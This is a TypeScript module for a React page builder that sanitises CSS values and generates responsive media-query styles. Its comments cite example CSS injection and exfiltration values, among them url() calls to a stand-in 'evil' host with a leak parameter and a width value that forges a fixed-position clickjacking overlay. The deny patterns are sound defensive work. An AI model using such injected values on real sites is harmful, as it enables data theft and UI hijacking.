import type { CSSProperties } from 'react';
import type { StyleProps } from './schema.js';

// Properties copied straight through (after value cleaning). Shorthands
// (padding/margin X-Y, gradient, background) are expanded separately below.
const DIRECT: (keyof StyleProps)[] = [
  'fontFamily', 'fontSize', 'fontWeight', 'lineHeight', 'letterSpacing', 'textAlign',
  'textTransform', 'fontStyle', 'textDecoration', 'color',
  'width', 'minWidth', 'maxWidth', 'height', 'minHeight', 'maxHeight', 'gap',
  'backgroundColor', 'backgroundImage', 'backgroundSize', 'backgroundPosition', 'backgroundRepeat',
  'border', 'borderColor', 'borderWidth', 'borderStyle', 'borderRadius',
  'boxShadow', 'opacity', 'filter', 'transform', 'transition',
  'display', 'flexDirection', 'flexWrap', 'justifyContent', 'alignItems',
  'position', 'top', 'right', 'bottom', 'left', 'zIndex',
  'gridTemplateColumns', 'aspectRatio', 'overflow',
];

// A single CSS value never contains rule/declaration/tag characters; rejecting
// them keeps a value from breaking out of the inline style OR a generated <style>
// rule, and blocks the classic CSS script vectors.
function clean(v: unknown): string | number | undefined {
  if (typeof v === 'number') return Number.isFinite(v) ? v : undefined;
  if (typeof v !== 'string') return undefined;
  const s = v.trim();
  if (!s) return undefined;
  if (s.length > 500) return undefined; // cap value length
  if (/[<>{};]/.test(s)) return undefined;
  // Block url() too: a CSS url() can exfiltrate to an external host (e.g.
  // background:url(https://evil/?leak=…)). Images go through the image atom + safeImageSrc.
  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return undefined;
  return s;
}

/**
 * Sanitise a value that reaches an inline style through `node.props` rather than
 * the style bag — the dimension props (`width`, `gutter`, `min`, `height`) read
 * directly by Section/Container/Grid/Spacer. These bypass `resolveStyle`, so
 * without this guard an authored `width="100px;position:fixed;top:0"` injects a
 * clickjacking overlay and `gutter="url(https://evil/?leak)"` exfiltrates via CSS.
 * Rejects and falls back rather than partially sanitising: a dimension is short.
 */
export function safeDim(v: unknown, fallback: string): string {
  const s = v == null ? '' : String(v);
  if (!s) return fallback;
  if (s.length > 64) return fallback;
  if (/[<>{};]/.test(s)) return fallback;
  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return fallback;
  return s;
}

/** Resolve a StyleProps into a React inline-style object (base breakpoint only). */
export function resolveStyle(style?: StyleProps): CSSProperties {
  if (!style) return {};
  const out: Record<string, string | number> = {};
  for (const k of DIRECT) {
    const val = clean(style[k] as unknown);
    if (val !== undefined) out[k] = val;
  }
  const set = (key: string, raw: unknown) => {
    const v = clean(raw);
    if (v !== undefined) out[key] = v;
  };
  set('padding', style.padding);
  if (clean(style.paddingX) !== undefined) { out.paddingLeft = clean(style.paddingX)!; out.paddingRight = clean(style.paddingX)!; }
  if (clean(style.paddingY) !== undefined) { out.paddingTop = clean(style.paddingY)!; out.paddingBottom = clean(style.paddingY)!; }
  set('margin', style.margin);
  if (clean(style.marginX) !== undefined) { out.marginLeft = clean(style.marginX)!; out.marginRight = clean(style.marginX)!; }
  if (clean(style.marginY) !== undefined) { out.marginTop = clean(style.marginY)!; out.marginBottom = clean(style.marginY)!; }
  // Background: gradient wins over the background shorthand.
  const grad = clean(style.gradient);
  const bg = clean(style.background);
  if (grad !== undefined) out.background = grad;
  else if (bg !== undefined) out.background = bg;
  // Layout-hijack guards: no fixed/sticky positioning (overlay attacks); cap z-index.
  if (out.position === 'fixed' || out.position === 'sticky') delete out.position;
  if (out.zIndex !== undefined) {
    const z = typeof out.zIndex === 'number' ? out.zIndex : parseInt(String(out.zIndex), 10);
    if (!Number.isFinite(z)) delete out.zIndex;
    else out.zIndex = Math.min(z, 9999);
  }
  return out as CSSProperties;
}

function kebab(k: string): string {
  return k.replace(/[A-Z]/g, (m) => `-${m.toLowerCase()}`);
}

function declarations(css: CSSProperties, important = false): string {
  const bang = important ? ' !important' : '';
  return Object.entries(css)
    .map(([k, v]) => `${kebab(k)}:${typeof v === 'number' ? v : v}${bang}`)
    .join(';');
}

const BREAKPOINTS = { sm: 640, md: 768, lg: 1024 } as const;

/**
 * Generate scoped media-query CSS for a node's responsive overrides.
 *
 * Declarations are marked `!important`. A node's BASE style is rendered as an
 * inline `style=` attribute, and an inline style outranks every class selector
 * no matter what media query wraps it — so without `!important`, `md:size=4rem`
 * simply never applied over a base `size=12px`, at any viewport. The atoms also
 * merge their own defaults into that same inline object, so moving the base out
 * to a class instead would let atom defaults beat the author's overrides.
 * `!important` is scoped to the node's own `.ak-<id>` class; values are already
 * sanitised by `clean()`, which rejects `;`, so a value cannot forge one.
 */
export function mediaCss(selector: string, responsive?: StyleProps['responsive']): string {
  if (!responsive) return '';
  let css = '';
  for (const bp of ['sm', 'md', 'lg'] as const) {
    const s = responsive[bp];
    if (!s) continue;
    const decls = declarations(resolveStyle(s), true);
    if (decls) css += `@media (min-width:${BREAKPOINTS[bp]}px){${selector}{${decls}}}`;
  }
  return css;
}
